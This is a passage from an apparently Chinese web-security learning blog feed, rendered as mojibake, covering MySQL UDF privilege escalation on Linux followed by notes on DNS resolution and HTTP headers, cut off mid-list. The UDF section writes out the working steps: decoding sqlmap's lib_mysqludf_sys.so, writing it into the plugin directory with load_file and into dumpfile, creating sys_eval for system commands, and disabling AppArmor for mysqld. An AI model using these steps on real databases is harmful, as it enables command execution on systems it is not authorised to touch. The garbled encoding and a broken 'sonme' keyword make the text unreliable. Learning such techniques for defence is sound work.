<p>ä»¥ä¸Šå°±æ˜¯åœ¨è¿›è¡Œsqlæ³¨å…¥å·¥ç¨‹ä¸­å¸¸ç”¨çš„å‡½æ•°ã€‚å½“ç„¶è¿˜å­˜åœ¨ä¸€äº›ä½¿ç”¨çš„ä¸æ˜¯å¾ˆå¤šçš„å‡½æ•°ã€‚</p>
</li>
</ol>
<h2 id="0x02-Linux-MySQL-UDFææƒ">0x02 Linux MySQL UDFææƒ</h2>
<h3 id="Step1-è·å–UDFæ–‡ä»¶">Step1 è·å–UDFæ–‡ä»¶</h3>
<ol>
<li>
<p>æŸ¥çœ‹MySQLç‰ˆæœ¬</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select version();</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/09/04/Eqbomf7AdWHCJ46.png" alt=""></p>
<p>Mysqlç‰ˆæœ¬å¤§äº5.1ç‰ˆæœ¬udf.dllæ–‡ä»¶å¿…é¡»æ”¾ç½®äºMYSQLå®‰è£…ç›®å½•ä¸‹çš„lib\pluginæ–‡ä»¶å¤¹ä¸‹</p>
</li>
<li>
<p>æŸ¥æ‰¾Pluginç›®å½•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select @@plugin_dir;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/09/04/kbd7FAIYerymlJa.png" alt=""></p>
</li>
<li>
<p>æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;%compile%&#39;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/09/05/VJ1i2fDFLjlcO8C.png" alt=""></p>
</li>
<li>
<p>åœ¨Kali Linuxä¸­æ‰¾åˆ°åˆé€‚çš„UDF</p>
<p><img src="C:%5CUsers%5C51196%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567644797501.png" alt="1567644797501"></p>
<blockquote>
<p>æ³¨ï¼šæ–°ç‰ˆsqlmap ä¸ºäº†é˜²æ­¢æ–‡ä»¶è¢«è¯¯æ€ï¼Œå¯¹æ–‡ä»¶è¿›è¡Œå¼‚æˆ–åŠ å¯†ï¼Œéœ€è¦ä½¿ç”¨<code>/usr/share/sqlmap/extra/cloak/</code>è·¯å¾„ä¸‹çš„cloak.pyè§£å¯†è„šæœ¬å¯¹<code>lib_mysqludf_sys.so_</code>è¿›è¡Œè§£ç ï¼Œå³<code>python cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_</code>å¾—åˆ°<code>lib_mysqludf_sys.so</code>æ–‡ä»¶</p>
</blockquote>
</li>
</ol>
<h3 id="Step2-ä¸Šä¼ UDFæ–‡ä»¶">Step2 ä¸Šä¼ UDFæ–‡ä»¶</h3>
<ol>
<li>
<p>é¦–å…ˆç¡®ä¿MySQLå…è®¸å¯¹ä»»æ„è·¯å¾„è¿›è¡Œè¯»å†™æ“ä½œï¼Œå³<code>secure_file_priv =</code></p>
<p><img src="https://i.loli.net/2019/09/05/X6zFtU5wSbcB4Me.png" alt=""></p>
</li>
<li>
<p>å°†<code>lib_mysqludf_sys.so</code>ä¼ è‡³<code>/tmp/</code>è·¯å¾„ä¸‹ï¼Œä½¿ç”¨<code>load_file()</code>å¯¹å…¶è¯»å–ï¼Œå¹¶è½¬æ¢æˆåå…­è¿›åˆ¶æ–‡ä»¶åå†å†™å…¥<code>/tmp/</code>ç›®å½•ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select hex(load_file(&#39;&#x2F;tmp&#x2F;lib_mysqludf_sys.so&#39;)) into dumpfile &#39;&#x2F;tmp&#x2F;udf.hex&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/09/05/U8WL4isHGR135SZ.png" alt=""></p>
</li>
<li>
<p>è¯»å–<code>udf.hex</code>æ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶ä¸Šä¼ è‡³<code>/usr/bin/mysql/plugin/</code>ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 0x[udf.hexå†…å®¹] into dumpfile &#39;&#x2F;usr&#x2F;bin&#x2F;mysql&#x2F;plugin&#x2F;udf.so&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Step3-æ‰§è¡Œå‘½ä»¤">Step3 æ‰§è¡Œå‘½ä»¤</h3>
<ol>
<li>
<p>å®‰è£…UDF</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create function sys_eval returns string sonme &#39;udf.so&#39;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/09/05/UNbKlLsftYQFX1h.png" alt=""></p>
</li>
<li>
<p>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p>
<p><img src="https://i.loli.net/2019/09/05/yxeQCoJdXN8kMlT.png" alt=""></p>
</li>
</ol>
<h2 id="0x03-è¸©è¿‡çš„å‘">0x03 è¸©è¿‡çš„å‘</h2>
<ol>
<li>
<p>åœ¨è®¾ç½® <code>secure_file_privilege=''</code> ä¸”ç›®å½•æƒé™ä¸º <code>777</code> å<code>load_file()</code> æ— æ³•è¯»å–æ–‡ä»¶ã€‚</p>
<ul>
<li><a href="https://bingslient.github.io/2019/08/16/MySQL%20%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E8%A1%A8%E7%9A%84%E5%88%A9%E7%94%A8/#%E4%BD%BF%E7%94%A8-load-file-%E5%87%BD%E6%95%B0">æ£€æŸ¥Apparmoré…ç½®</a></li>
<li>æ£€æŸ¥æ–‡ä»¶çš„ç”¨æˆ·ç»„æ˜¯å¦æ˜¯å±äºmysql</li>
</ul>
</li>
<li>
<p>æ— æ³•ä¸Šä¼ <code>udf.so</code>è‡³<code>/usr/bin/mysql/plugin/</code>ç›®å½•ã€‚</p>
<ul>
<li>æ£€æŸ¥è¯¥ç›®å½•çš„å…¶ä»–ç»„ç”¨æˆ·å—å¦æœ‰è¯»å†™æƒé™</li>
<li>æ£€æŸ¥æ–‡ä»¶çš„ç”¨æˆ·ç»„æ˜¯å¦æ˜¯å±äºmysql</li>
</ul>
</li>
<li>
<p>ä¸Šä¼ <code>udf.so</code>è‡³æŒ‡å®šç›®å½•åï¼Œ<code>create function</code>å¤±è´¥ã€‚</p>
<ul>
<li>UDFä½¿ç”¨çš„ç‰ˆæœ¬å’Œæœ¬æœºç¯å¢ƒä¸åŒ¹é…</li>
<li>æ²¡æœ‰å¯¹sqlmapä¸­çš„UDFæ–‡ä»¶è¿›è¡Œè§£ç æ“ä½œ</li>
</ul>
</li>
<li>
<p>ä½¿ç”¨<code>select sys_eval();</code>æ‰§è¡Œå‘½ä»¤è¿”å›<code>NULL</code>ã€‚</p>
<p><a href="https://www.cyberciti.biz/faq/ubuntu-linux-howto-disable-apparmor-commands/">å–æ¶ˆApparmorå¯¹mysqld serviceçš„é™åˆ¶</a></p>
<p>ç®€å•æ¥è¯´å°±æ˜¯æ‰§è¡Œä¸‹é¢ä¸¤ä¸ªå‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ln -s /etc/apparmor.d/usr.sbin.mysqld /etc/apparmor.d/<span class="built_in">disable</span>/</span><br><span class="line">sudo apparmor_parser -R /etc/apparmor.d/usr.sbin.mysqld</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>webå®‰å…¨åŸºç¡€</tag>
        <tag>MySQL</tag>
        <tag>UDFææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title>Webå®‰å…¨å­¦ä¹ ä¹‹Webé¡µé¢è§£æçš„æµç¨‹å­¦ä¹ </title>
    <url>/Web_security/basic_learning/6.Web%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="Webå®‰å…¨å­¦ä¹ ä¹‹Webé¡µé¢è§£æçš„æµç¨‹å­¦ä¹ ">Webå®‰å…¨å­¦ä¹ ä¹‹Webé¡µé¢è§£æçš„æµç¨‹å­¦ä¹ </h1>
<h2 id="ä»»åŠ¡ç›®æ ‡">ä»»åŠ¡ç›®æ ‡</h2>
<ol>
<li>ç†è§£åŸŸåè§£æçš„æ•´ä¸ªæµç¨‹ï¼›</li>
<li>ç†è§£Webé¡µé¢è¯·æ±‚çš„æ•´ä¸ªæµç¨‹ï¼Œç»˜åˆ¶æµç¨‹å›¾ï¼ˆngnixå¤„ç†çš„11ä¸ªè¿‡ç¨‹ï¼‰ï¼›</li>
<li>å­¦ä¹ HTTPåè®®ä¸­çš„å­—æ®µåŠå«ä¹‰ï¼›</li>
<li>å­¦ä¹ HTTPè¯·æ±‚æ–¹æ³•ä»¥åŠè¿”å›çŠ¶æ€ç çš„ç±»å‹å’Œå«ä¹‰ã€‚</li>
</ol>
<a id="more"></a>
<h2 id="0x01-åŸŸåè§£ææµç¨‹">0x01 åŸŸåè§£ææµç¨‹</h2>
<p><a href="https://jocent.me/2017/06/18/dns-protocol-principle.html#_label2">è¿™ç¯‡æ–‡ç« </a>å¯¹äºDNSè®²çš„è¿˜æ¯”è¾ƒé€å½»ï¼Œåœ¨æ­¤åŸºç¡€åšä¸€ç‚¹æ‘˜è¦ã€‚</p>
<h3 id="åŸŸåå±‚æ¬¡ç»“æ„">åŸŸåå±‚æ¬¡ç»“æ„</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200330233913.png" alt="">)</p>
<h3 id="åŸŸåæœåŠ¡å™¨">åŸŸåæœåŠ¡å™¨</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200330233929.png" alt="">)<br>
å¦å¤–è¿˜æœ‰ä¸€ä¸ªæœ¬åœ°åŸŸåæœåŠ¡å™¨ï¼šå½“ä¸€ä¸ªä¸»æœºå‘å‡ºDNSæŸ¥è¯¢è¯·æ±‚çš„æ—¶å€™ï¼Œè¿™ä¸ªæŸ¥è¯¢è¯·æ±‚é¦–å…ˆå°±æ˜¯å‘ç»™æœ¬åœ°åŸŸåæœåŠ¡å™¨çš„ã€‚</p>
<h3 id="åŸŸåè§£æè®°å½•">åŸŸåè§£æè®°å½•</h3>
<ul>
<li>A (Address) è®°å½•ï¼šåˆç§°IPæŒ‡å‘ï¼Œç”¨æˆ·å¯ä»¥åœ¨æ­¤è®¾ç½®â¼¦åŸŸåå¹¶æŒ‡å‘åˆ°â¾ƒâ¼°çš„â½¬æ ‡ä¸»æœºåœ°å€ä¸Šï¼Œä»<br>
è€Œå®ç°é€šè¿‡åŸŸåæ‰¾åˆ°æœåŠ¡å™¨ã€‚</li>
<li>CNAMEè®°å½•ï¼šä¹Ÿè¢«ç§°ä¸ºè§„èŒƒåå­—ã€‚è¿™ç§è®°å½•å…è®¸æ‚¨å°†å¤šä¸ªåå­—æ˜ å°„åˆ°åŒâ¼€å°è®¡ç®—æœºã€‚</li>
<li>MXï¼ˆMail Exchangerï¼‰è®°å½•ï¼šé‚®ä»¶äº¤æ¢è®°å½•ï¼Œå®ƒæŒ‡å‘â¼€ä¸ªé‚®ä»¶æœåŠ¡å™¨ï¼Œâ½¤äºç”µâ¼¦é‚®ä»¶ç³»ç»Ÿå‘é‚®<br>
ä»¶æ—¶æ ¹æ® æ”¶ä¿¡â¼ˆçš„åœ°å€åç¼€æ¥å®šä½é‚®ä»¶æœåŠ¡å™¨ã€‚</li>
<li>NS(Name Server)è®°å½•ï¼šè§£ææœåŠ¡å™¨è®°å½•ã€‚â½¤æ¥è¡¨æ˜ç”±å“ªå°æœåŠ¡å™¨å¯¹è¯¥åŸŸåè¿›â¾è§£æã€‚è¿™â¾¥çš„NS<br>
è®°å½•åªå¯¹â¼¦åŸŸåâ½£æ•ˆã€‚</li>
<li>TXTè®°å½•ï¼šâ¼€èˆ¬æŒ‡ä¸ºæŸä¸ªä¸»æœºåæˆ–åŸŸåè®¾ç½®çš„è¯´æ˜ã€‚</li>
</ul>
<h3 id="åŸŸåè§£æè¿‡ç¨‹">åŸŸåè§£æè¿‡ç¨‹</h3>
<p>ä»¥æŸ¥è¯¢<code>jocent.me</code>ä¸ºä¾‹ï¼Œå…¶ä¸­10.74.36.90ä¸ºä¸»æœºIPï¼Œ10.74.1.11ä¸ºæœ¬åœ°DNSæœåŠ¡å™¨ï¼š<br>
â‘ ä¸»æœº10.74.36.90å…ˆå‘æœ¬åœ°åŸŸåæœåŠ¡å™¨10.74.1.11è¿›è¡Œé€’å½’æŸ¥è¯¢<br>
â‘¡æœ¬åœ°åŸŸåæœåŠ¡å™¨é‡‡ç”¨è¿­ä»£æŸ¥è¯¢ï¼Œå‘ä¸€ä¸ªæ ¹åŸŸåæœåŠ¡å™¨è¿›è¡ŒæŸ¥è¯¢<br>
â‘¢æ ¹åŸŸåæœåŠ¡å™¨å‘Šè¯‰æœ¬åœ°åŸŸåæœåŠ¡å™¨ï¼Œä¸‹ä¸€æ¬¡åº”è¯¥æŸ¥è¯¢çš„é¡¶çº§åŸŸåæœåŠ¡å™¨<code>dns.me</code>çš„IPåœ°å€<br>
â‘£æœ¬åœ°åŸŸåæœåŠ¡å™¨å‘é¡¶çº§åŸŸåæœåŠ¡å™¨<code>dns.me</code>è¿›è¡ŒæŸ¥è¯¢<br>
â‘¤é¡¶çº§åŸŸåæœåŠ¡å™¨meå‘Šè¯‰æœ¬åœ°åŸŸåæœåŠ¡å™¨ï¼Œä¸‹ä¸€æ­¥æŸ¥è¯¢æƒé™æœåŠ¡å™¨<code>dns.jocent.me</code>çš„IPåœ°å€<br>
â‘¥æœ¬åœ°åŸŸåæœåŠ¡å™¨å‘æƒé™æœåŠ¡å™¨<code>dns.jocent.me</code>è¿›è¡ŒæŸ¥è¯¢<br>
â‘¦æƒé™æœåŠ¡å™¨<code>dns.jocent.me</code>å‘Šè¯‰æœ¬åœ°åŸŸåæœåŠ¡å™¨æ‰€æŸ¥è¯¢çš„ä¸»æœºçš„IPåœ°å€<br>
â‘§æœ¬åœ°åŸŸåæœåŠ¡å™¨æœ€åæŠŠæŸ¥è¯¢ç»“æœå‘Šè¯‰ 10.74.36.90</p>
<p>æ€»çš„æ¥è¯´DNSè§£æè¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://i.loli.net/2019/10/02/s2INm7z6lAatQgq.png" alt=""></p>
<p>å…¶ä¸­æœ‰ä¸¤ä¸ªæ¦‚å¿µé€’å½’æŸ¥è¯¢å’Œè¿­ä»£æŸ¥è¯¢:<br>
<strong>é€’å½’æŸ¥è¯¢</strong>ï¼šæœ¬æœºå‘æœ¬åœ°åŸŸåæœåŠ¡å™¨å‘å‡ºä¸€æ¬¡æŸ¥è¯¢è¯·æ±‚ï¼Œå°±é™å¾…æœ€ç»ˆçš„ç»“æœã€‚å¦‚æœæœ¬åœ°åŸŸåæœåŠ¡å™¨æ— æ³•è§£æï¼Œè‡ªå·±ä¼šä»¥DNSå®¢æˆ·æœºçš„èº«ä»½å‘å…¶å®ƒåŸŸåæœåŠ¡å™¨æŸ¥è¯¢ï¼Œç›´åˆ°å¾—åˆ°æœ€ç»ˆçš„IPåœ°å€å‘Šè¯‰æœ¬æœºã€‚</p>
<p><img src="https://i.loli.net/2019/10/02/thQ9PuoYVvHN5dr.png" alt=""></p>
<p><strong>è¿­ä»£æŸ¥è¯¢</strong>ï¼šæœ¬åœ°åŸŸåæœåŠ¡å™¨å‘æ ¹åŸŸåæœåŠ¡å™¨æŸ¥è¯¢ï¼Œæ ¹åŸŸåæœåŠ¡å™¨å‘Šè¯‰å®ƒä¸‹ä¸€æ­¥åˆ°å“ªé‡Œå»æŸ¥è¯¢ï¼Œç„¶åå®ƒå†å»æŸ¥ï¼Œæ¯æ¬¡å®ƒéƒ½æ˜¯ä»¥å®¢æˆ·æœºçš„èº«ä»½å»å„ä¸ªæœåŠ¡å™¨æŸ¥è¯¢ã€‚</p>
<p><img src="https://i.loli.net/2019/10/02/drSEsaVmZwnGclj.png" alt=""></p>
<h2 id="0x02-Webé¡µé¢è¯·æ±‚æµç¨‹">0x02 Webé¡µé¢è¯·æ±‚æµç¨‹</h2>
<p><img src="https://i.loli.net/2019/10/02/ao2QAZIYLqRtX61.png" alt=""></p>
<p>å¯¹NginxçŸ¥ä¹‹ç”šå°‘ï¼Œå…³äºNginxçš„è¯·æ±‚å¤„ç†é˜¶æ®µå…ˆå ä¸ªå‘ï¼Œç•™ä¸ªæ¯”è¾ƒå…¨é¢çš„<a href="https://www.kancloud.cn/kancloud/master-nginx-develop/51835">å­¦ä¹ æ–‡æ¡£</a>å ä¸ªå‘ã€‚</p>
<h2 id="0x03-HTTPåè®®çš„å­—æ®µåŠå«ä¹‰">0x03 HTTPåè®®çš„å­—æ®µåŠå«ä¹‰</h2>
<h3 id="HTTPè¯·æ±‚æŠ¥æ–‡">HTTPè¯·æ±‚æŠ¥æ–‡</h3>
<p>è¯·æ±‚æŠ¥æ–‡ç»“æ„ï¼š</p>
<p><img src="https://i.loli.net/2019/10/02/VRbOd42c61jHhMp.png" alt=""></p>
<p>å…¶ä¸­ï¼Œå€¼å¾—å…³æ³¨çš„æ˜¯HTTPæŠ¥æ–‡å¤´ç”±æ–¹æ³•ã€URI ã€HTTPç‰ˆæœ¬ã€HTTPé¦–éƒ¨å­—æ®µç­‰éƒ¨åˆ†æ„æˆã€‚<br>
ä¾‹å¦‚ï¼Œè¯·æ±‚<code>hackr.jp</code>ç½‘ç«™çš„è¯·æ±‚æŠ¥æ–‡å¤´å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p><img src="https://i.loli.net/2019/10/02/w5tUWEacQ6lIFpq.png" alt=""></p>
<h3 id="HTTPå“åº”æŠ¥æ–‡">HTTPå“åº”æŠ¥æ–‡</h3>
<p>å“åº”æŠ¥æ–‡ç»“æ„ï¼š</p>
<p><img src="https://i.loli.net/2019/10/02/eimUWAOTCLDrw8B.png" alt=""></p>
<p>ä¾‹å¦‚ï¼Œåˆšåˆšè¯·æ±‚çš„<code>hackr.jp</code>çš„å“åº”æŠ¥æ–‡å¤´å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p><img src="https://i.loli.net/2019/10/02/q5HAVfkM6Ots7Zg.png" alt=""></p>
<h3 id="HTTPé¦–éƒ¨å­—æ®µç±»å‹">HTTPé¦–éƒ¨å­—æ®µç±»å‹</h3>
<ul>
<li>
<p>é€šç”¨é¦–éƒ¨å­—æ®µï¼ˆGeneral Header Fieldsï¼‰<br>
è¯·æ±‚æŠ¥æ–‡å’Œå“åº”æŠ¥æ–‡ä¸¤æ–¹éƒ½ä¼šä½¿ç”¨çš„é¦–éƒ¨ã€‚</p>
<ul>
<li>
<p>Cache-Controlå­—æ®µ</p>
<p>é€šè¿‡æŒ‡å®šé¦–éƒ¨å­—æ®µ Cache-Control çš„æŒ‡ä»¤ï¼Œå°±èƒ½æ“ä½œç¼“å­˜çš„å·¥ä½œæœºåˆ¶ã€‚</p>
<p>ç¼“å­˜è¯·æ±‚æŒ‡ä»¤ä¸€è§ˆï¼š</p>
<table>
<thead>
<tr>
<th>æŒ‡ä»¤</th>
<th>Client</th>
<th>Server</th>
</tr>
</thead>
<tbody>
<tr>
<td>no-cache</td>
<td>ä¸æ¥æ”¶ç¼“å­˜è¿‡çš„å“åº”</td>
<td>ä¸èƒ½å¯¹èµ„æºè¿›è¡Œç¼“å­˜</td>
</tr>
<tr>
<td>no-store</td>
<td>ä¸ç¼“å­˜è¯·æ±‚æˆ–å“åº”çš„ä»»ä½•å†…å®¹</td>
<td>ä¸ç¼“å­˜è¯·æ±‚æˆ–å“åº”çš„ä»»ä½•å†…å®¹</td>
</tr>
<tr>
<td>max-age = [ç§’]</td>
<td>æ¥æ”¶ç¼“å­˜æ—¶é—´æ¯”max-ageæ•°å€¼æ›´å°çš„èµ„æº</td>
<td>ä»£è¡¨èµ„æºä¿å­˜ä¸ºç¼“å­˜çš„æœ€é•¿æ—¶é—´</td>
</tr>
<tr>
<td>max-stale = [ç§’]</td>
<td>æ¥æ”¶å·²è¿‡æœŸçš„å“åº”</td>
<td></td>
</tr>
<tr>
<td>min-fresh = [ç§’]</td>
<td>æœŸæœ›åœ¨æŒ‡å®šæ—¶é—´å†…çš„å“åº”ä»æœ‰æ•ˆ</td>
<td></td>
</tr>
<tr>
<td>no-transform</td>
<td>ä»£ç†ä¸å¯æ›´æ”¹åª’ä½“ç±»å‹</td>
<td></td>
</tr>
<tr>
<td>only-if-cached</td>
<td>ä»ç¼“å­˜è·å–èµ„æº</td>
<td></td>
</tr>
<tr>
<td>cache-extension</td>
<td>æ–°æŒ‡ä»¤æ ‡è®°</td>
<td></td>
</tr>
</tbody>
</table>
<p>**æ³¨æ„ï¼š**ä»å­—é¢æ„æ€ä¸Šå¾ˆå®¹æ˜“æŠŠ no-cache è¯¯è§£æˆä¸ºä¸ç¼“å­˜ï¼Œä½†äº‹å®ä¸Š no-cache ä»£è¡¨ä¸ç¼“å­˜è¿‡æœŸçš„èµ„æºï¼Œç¼“å­˜ä¼šå‘æºæœåŠ¡å™¨è¿›è¡Œæœ‰æ•ˆæœŸç¡®è®¤åå¤„ç†èµ„æºï¼Œä¹Ÿè®¸ç§°ä¸º do-notserve-from-cache-without-revalidation æ›´åˆé€‚ï¼Œno-store æ‰æ˜¯çœŸæ­£åœ°ä¸è¿›è¡Œç¼“å­˜ã€‚</p>
</li>
<li>
<p>Connectionå­—æ®µ</p>
<p>å…·å¤‡ä¸¤ä¸ªä½œç”¨ï¼š</p>
<ul>
<li>
<p>æ§åˆ¶ä¸å†è½¬å‘ç»™ä»£ç†çš„é¦–éƒ¨å­—æ®µ</p>
<p><code>conneciton: upgrade</code>è¡¨ç¤ºUpgradeé¦–éƒ¨å­—æ®µäº§ç”Ÿä½œç”¨çš„Upgradeå¯¹è±¡ä»…é™äºå®¢æˆ·ç«¯å’Œé‚»æ¥æœåŠ¡å™¨ä¹‹é—´ã€‚</p>
</li>
<li>
<p>ç®¡ç†æŒä¹…è¿æ¥</p>
<p>HTTP/1.1 ç‰ˆæœ¬çš„é»˜è®¤è¿æ¥éƒ½æ˜¯æŒä¹…è¿æ¥ã€‚ä¸ºæ­¤ï¼Œå®¢æˆ·ç«¯ä¼šåœ¨æŒä¹…è¿æ¥ä¸Šè¿ç»­å‘é€è¯·æ±‚ã€‚å½“æœåŠ¡å™¨ç«¯æƒ³æ˜ç¡®æ–­å¼€è¿æ¥æ—¶ï¼Œåˆ™æŒ‡å®š<br>
Connection é¦–éƒ¨å­—æ®µçš„å€¼ä¸º Closeã€‚</p>
</li>
</ul>
</li>
<li>
<p>Dateå­—æ®µ</p>
<p>é¦–éƒ¨å­—æ®µ Date è¡¨æ˜åˆ›å»º HTTP æŠ¥æ–‡çš„æ—¥æœŸå’Œæ—¶é—´ã€‚</p>
</li>
<li>
<p>Transfer-Encodingå­—æ®µ</p>
<p>é¦–éƒ¨å­—æ®µ Transfer-Encoding è§„å®šäº†ä¼ è¾“æŠ¥æ–‡ä¸»ä½“æ—¶é‡‡ç”¨çš„ç¼–ç æ–¹å¼ã€‚</p>
</li>
<li>
<p>Upgradeå­—æ®µ</p>
<p>é¦–éƒ¨å­—æ®µ Upgrade ç”¨äºæ£€æµ‹ HTTP åè®®åŠå…¶ä»–åè®®æ˜¯å¦å¯ä½¿ç”¨æ›´é«˜çš„<br>
ç‰ˆæœ¬è¿›è¡Œé€šä¿¡ï¼Œå…¶å‚æ•°å€¼å¯ä»¥ç”¨æ¥æŒ‡å®šä¸€ä¸ªå®Œå…¨ä¸åŒçš„é€šä¿¡åè®®ã€‚</p>
</li>
<li>
<p>Viaå­—æ®µ</p>
<p>ä½¿ç”¨é¦–éƒ¨å­—æ®µ Via æ˜¯ä¸ºäº†è¿½è¸ªå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´çš„è¯·æ±‚å’Œå“åº”æŠ¥æ–‡çš„ä¼ è¾“è·¯å¾„ã€‚</p>
</li>
</ul>
</li>
<li>
<p>è¯·æ±‚é¦–éƒ¨å­—æ®µï¼ˆRequest Header Fieldsï¼‰<br>
ä»å®¢æˆ·ç«¯å‘æœåŠ¡å™¨ç«¯å‘é€è¯·æ±‚æŠ¥æ–‡æ—¶ä½¿ç”¨çš„é¦–éƒ¨ã€‚è¡¥å……äº†è¯·æ±‚çš„é™„åŠ å†…å®¹ã€å®¢æˆ·ç«¯ä¿¡æ¯ã€å“åº”å†…å®¹ç›¸å…³ä¼˜å…ˆçº§ç­‰ä¿¡æ¯ã€‚</p>
<table>
<thead>
<tr>
<th>é¦–éƒ¨å­—æ®µå</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td>Accept</td>
<td>ç”¨æˆ·ç†å¯å¤„ç†çš„åª’ä½“ç±»å‹</td>
</tr>
<tr>
<td>Accept-Charset</td>
<td>ä¼˜å…ˆçš„å­—ç¬¦é›†</td>
</tr>
<tr>
<td>Accept-Encoding</td>
<td>ä¼˜å…ˆçš„å†…å®¹ç¼–ç </td>
</tr>
<tr>
<td>Accept-Language</td>
<td>ä¼˜å…ˆçš„è¯­è¨€</td>
</tr>
<tr>
<td>Authorization</td>
<td>Webè®¤è¯ä¿¡æ¯</td>
</tr>
<tr>
<td>Expect</td>
<td>æœŸå¾…æœåŠ¡å™¨çš„ç‰¹å®šè¡Œä¸º</td>
</tr>
<tr>
<td>From</td>
<td>ç”¨æˆ·çš„ç”µå­é‚®ç®±</td>
</tr>
<tr>
<td>Host</td>
<td>è¯·æ±‚èµ„æºæ‰€åœ¨çš„æœåŠ¡å™¨</td>
</tr>
<tr>
<td>If-Match</td>
<td>æ¯”è¾ƒå®ä½“æ ‡å¿—ï¼ˆETagï¼‰</td>
</tr>
<tr>
<td>If-None-Match</td>
<td>æ¯”è¾ƒå®ä½“æ ‡å¿—ï¼ˆETagï¼‰</td>
</tr>
<tr>
<td>If-Modified-Since</td>
<td>æ¯”è¾ƒèµ„æºæ›´æ–°æ—¶é—´</td>
</tr>
<tr>
<td>If-Range</td>
<td>èµ„æºæœªæ›´æ–°æ—¶å‘é€å®ä½“Byteçš„èŒƒå›´è¯·æ±‚</td>
</tr>
<tr>
<td>If-Unmodified-Since</td>
<td>æ¯”è¾ƒèµ„æºæ›´æ–°æ—¶é—´ï¼ˆä¸If-Modified-Sinceç›¸åï¼‰</td>
</tr>
<tr>
<td>Max-Forward</td>
<td>æœ€å¤§ä¼ è¾“é€è·³æ•°</td>
</tr>
<tr>
<td>Proxy-Authorization</td>
<td>ä»£ç†æœåŠ¡å™¨è¦æ±‚å®¢â¼¾ç«¯çš„è®¤è¯ä¿¡æ¯</td>
</tr>
<tr>
<td>Referer</td>
<td>å¯¹è¯·æ±‚ä¸­URIçš„åŸå§‹è·å–æ–¹</td>
</tr>
<tr>
<td>TE</td>
<td>ä¼ è¾“ç¼–ç çš„ä¼˜å…ˆçº§</td>
</tr>
<tr>
<td>User-Agent</td>
<td>HTTPå®¢æˆ·ç«¯ç¨‹åºä¿¡æ¯</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>å“åº”é¦–éƒ¨å­—æ®µï¼ˆResponse Header Fieldsï¼‰<br>
ä»æœåŠ¡å™¨ç«¯å‘å®¢æˆ·ç«¯è¿”å›å“åº”æŠ¥æ–‡æ—¶ä½¿ç”¨çš„é¦–éƒ¨ã€‚è¡¥å……äº†å“åº”çš„é™„åŠ å†…å®¹ï¼Œä¹Ÿä¼šè¦æ±‚å®¢æˆ·ç«¯é™„åŠ é¢å¤–çš„å†…å®¹ä¿¡æ¯ã€‚</p>
<table>
<thead>
<tr>
<th>é¦–éƒ¨å­—æ®µ</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td>Accept-Ranges</td>
<td>æ˜¯å¦æ¥å—å­—æ®µèŒƒå›´è¯·æ±‚</td>
</tr>
<tr>
<td>Age</td>
<td>æ¨ç®—èµ„æºåˆ›å»ºç»è¿‡æ—¶é—´</td>
</tr>
<tr>
<td>ETag</td>
<td>èµ„æºåŒ¹é…ä¿¡æ¯</td>
</tr>
<tr>
<td>Location</td>
<td>ä»¤å®¢æˆ·ç«¯é‡å®šå‘è‡³æŒ‡å®šURI</td>
</tr>
<tr>
<td>Proxy-Authenticate</td>
<td>ä»£ç†æœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯çš„è®¤è¯ä¿¡æ¯</td>
</tr>
<tr>
<td>Retry-After</td>
<td>å¯¹å†æ¬¡å‘èµ·è¯·æ±‚çš„æ—¶æœºè¦æ±‚</td>
</tr>
<tr>
<td>Server</td>
<td>HTTPæœåŠ¡å™¨çš„å®‰è£…ä¿¡æ¯</td>
</tr>
<tr>
<td>Vary</td>
<td>ä»£ç†æœåŠ¡å™¨ç¼“å­˜çš„ç®¡ç†ä¿¡æ¯</td>
</tr>
<tr>
<td>WWW-Authenticate</td>
<td>æœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯çš„è®¤è¯ä¿¡æ¯</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>å®ä½“é¦–éƒ¨å­—æ®µï¼ˆEntity Header Fieldsï¼‰<br>
